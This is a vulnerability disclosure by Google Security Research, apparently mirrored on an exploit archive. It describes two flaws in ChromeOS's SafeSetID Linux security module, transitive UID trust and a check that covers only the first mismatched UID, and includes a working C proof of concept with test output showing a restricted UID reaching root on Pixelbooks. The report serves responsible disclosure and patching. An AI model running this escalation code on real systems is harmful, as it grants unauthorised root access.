@@ -1,0 +1,204 @@
+id: 32952
+date: 07/03/2019
+title: Google ChromeOS SafeSetID LSM Transitive Trust Exploit
+author: Google Security Research
+cves: 
+
+ChromeOS: multiple issues in SafeSetID LSM 
+
+
+
+I decided to take a look at the new SafeSetID LSM that ChromeOS upstreamed
+(<https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/security/safesetid>)
+and found several issues. Since this LSM is already running on Pixelbook on the
+stable channel, I'm filing this as a security bug.
+
+This LSM restricts the use of CAP_SETUID by specific UIDs as follows:
+
+ - The capability may only be used for set*uid() syscalls.
+ - The use of CAP_SETUID to transition to UIDs that the process did not
+   previously have in its credentials struct (as real, effective, or saved UID)
+   is limited to a whitelist of target UIDs.
+
+The ruleset is manipulated through two securityfs entries; one of them clears
+the active ruleset (permitting everything), the other one adds a single entry to
+the ruleset (restricting the UID and adding a permitted transition for it at
+the same time) on every write().
+
+The policies that Chrome OS uses (in the git master version) are at:
+<https://chromium.googlesource.com/chromiumos/platform2/+/master/shill/setuid_restrictions/shill_whitelist.txt>
+<https://chromium.googlesource.com/chromiumos/platform2/+/master/authpolicy/setuid_restrictions/authpolicyd_whitelist.txt>
+<https://chromium.googlesource.com/chromiumos/platform2/+/master/cros-disks/setuid_restrictions/cros_disks_whitelist.txt>
+
+The policy consists of lines that contain \"<srcuid>:<dstuid>\" pairs.
+
+
+The first problem is that a process can access any UID that is _transitively_
+permitted by the policy. For example, the avfs user (UID 213) is allowed to
+transition to the nobody user (UID 65534), and since the nobody user is
+unconstrained, the process can then transition to any other UID.
+
+Weirdly, the policy shill_whitelist.txt contains two same-UID pairs to inhibit
+the use of setuid() from those two UIDs (openvpn and strongSwan), but other UIDs
+are left unconstrained.
+
+
+The second problem is this logic in the kernel code:
+
+        /*
+         * Users for which setuid restrictions exist cannot change the
+         * real UID, effective UID, or saved set-UID to anything but
+         * one of: the current real UID, the current effective UID or
+         * the current saved set-user-ID unless an explicit whitelist
+         * policy allows the transition.
+         */
+        if (!uid_eq(new->uid, old->uid) &&
+                !uid_eq(new->uid, old->euid) &&
+                !uid_eq(new->uid, old->suid)) {
+                return check_uid_transition(old->uid, new->uid);
+        }
+        if (!uid_eq(new->euid, old->uid) &&
+                !uid_eq(new->euid, old->euid) &&
+                !uid_eq(new->euid, old->suid)) {
+                return check_uid_transition(old->euid, new->euid);
+        }
+        if (!uid_eq(new->suid, old->uid) &&
+                !uid_eq(new->suid, old->euid) &&
+                !uid_eq(new->suid, old->suid)) {
+                return check_uid_transition(old->suid, new->suid);
+        }
+        break;
+
+The LSM only checks the first UID pair with a mismatch. So, for example, if a
+process with ruid=1,euid=1,suid=1 calls setresuid(2,3,4), the LSM only checks
+whether the transition 1->2 is permitted, but the process also gains access to
+UIDs 3 and 4.
+
+
+Apart from these bigger problems, I think that the non-atomic policy update
+mechanism is also problematic for several reasons, although these things might
+not be very relevant for you in the context of ChromeOS:
+
+ - While a policy is being loaded, once a single parent-child pair has been
+   loaded, the parent is restricted to that specific child, even if
+   subsequent rules would allow transitions to other child UIDs. This means
+   that during policy loading, set*uid() can randomly fail.
+ - To replace the policy without rebooting, it is necessary to first flush
+   all old rules. This creates a time window in which no constraints are
+   placed on the use of CAP_SETUID.
+ - If we want to perform sanity checks on the final policy, this requires
+   that the policy isn't constructed in a piecemeal fashion without telling
+   the kernel when it's done.
+
+Other kernel APIs - including things like the userns code and netfilter -
+avoid this problem by performing updates atomically. Luckily, SafeSetID
+hasn't landed in a stable (upstream) release yet, so maybe it's not too
+late to completely change the API.
+
+
+I am attaching a suggested patch series for this and other minor issues in the
+LSM. Feel free to use these, modify them, or write your own patches.
+
+
+I have tested these issues on a Pixelbook running Chrome OS stable in dev mode,
+version:
+Google Chrome   72.0.3626.122 (Official Build) (64-bit)
+Revision        e78ac5b2c005af6b8bdcced26e44036559f636b0-refs/branch-heads/3626@{#884}
+Platform        11316.165.0 (Official Build) stable-channel eve
+
+Test code:
+===============
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/prctl.h>
+#include <err.h>
+#include <sys/capability.h>
+#include <linux/securebits.h>
+#include <stdlib.h>
+
+#define RESTRICTED_UID 213
+#define ROOT_UID 0
+#define ALLOWED_UID 301
+
+int main(int argc, char **argv) {
+  int mode = atoi(argv[1]);
+
+  if (prctl(PR_SET_SECUREBITS, SECBIT_NO_SETUID_FIXUP)) err(1, \"PR_SET_SECUREBITS\");
+  cap_t my_cap = cap_init();
+  if (!my_cap) err(1, \"alloc cap\");
+  const cap_value_t retained_caps[] = { CAP_SETUID };
+  if (cap_set_flag(my_cap, CAP_EFFECTIVE, 1, retained_caps, CAP_SET)) err(1, \"cap_set_flag\");
+  if (cap_set_flag(my_cap, CAP_PERMITTED, 1, retained_caps, CAP_SET)) err(1, \"cap_set_flag\");
+  if (cap_set_proc(my_cap)) err(1, \"cap_set_proc\");
+  if (setresuid(RESTRICTED_UID, RESTRICTED_UID, RESTRICTED_UID)) err(1, \"setresuid ->restricted\");
+
+  if (mode == 0) {
+    if (setresuid(ROOT_UID, ROOT_UID, ROOT_UID)) {
+      err(1, \"setresuid ->root\");
+    } else {
+      errx(1, \"setresuid ->root permitted\");
+    }
+  } else if (mode == 1) {
+    if (setresuid(ALLOWED_UID, ROOT_UID, ROOT_UID)) {
+      err(1, \"setresuid ->root (1)\");
+    } else {
+      puts(\"setresuid ->(allowed_safe,root,root) permitted\");
+    }
+    if (setresuid(ROOT_UID, ROOT_UID, ROOT_UID)) {
+      err(1, \"setresuid ->root (2)\");
+    } else {
+      puts(\"setresuid ->(root,root,root) permitted\");
+    }
+  } else if (mode == 2) {
+    if (setresuid(ALLOWED_UID, ALLOWED_UID, ALLOWED_UID)) {
+      err(1, \"setresuid ->allowed\");
+    } else {
+      puts(\"setresuid ->(allowed,allowed,allowed) permitted\");
+    }
+    if (setresuid(ROOT_UID, ROOT_UID, ROOT_UID)) {
+      err(1, \"setresuid ->root\");
+    } else {
+      puts(\"setresuid ->(root,root,root) permitted\");
+    }
+  }
+}
+===============
+
+Result:
+localhost ~ # /usr/local/static_test 0
+static_test: setresuid ->root: Operation not permitted
+localhost ~ # /usr/local/static_test 1
+setresuid ->(allowed_safe,root,root) permitted
+setresuid ->(root,root,root) permitted
+localhost ~ # /usr/local/static_test 2
+setresuid ->(allowed,allowed,allowed) permitted
+setresuid ->(root,root,root) permitted
+localhost ~ # 
+
+
+I also tested on dev channel, version:
+Google Chrome   74.0.3729.37 (Official Build) dev (64-bit)
+Revision        cb7e0a034927b09464caabd916de28c4156306d7-refs/branch-heads/3729@{#441}
+Platform        11895.33.0 (Official Build) dev-channel eve SingleProcessMash
+
+Result:
+localhost / # /usr/local/static_test 0
+static_test: setresuid ->root: Operation not permitted
+localhost / # /usr/local/static_test 1
+setresuid ->(allowed_safe,root,root) permitted
+setresuid ->(root,root,root) permitted
+localhost / # /usr/local/static_test 2
+setresuid ->(allowed,allowed,allowed) permitted
+setresuid ->(root,root,root) permitted
+localhost / # 
+
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse
+or a patch has been made broadly available (whichever is earlier), the bug
+report will become visible to the public.
+
+
+Found by: jannh@google.com
+
+#  0day.today [2023-03-22]  #
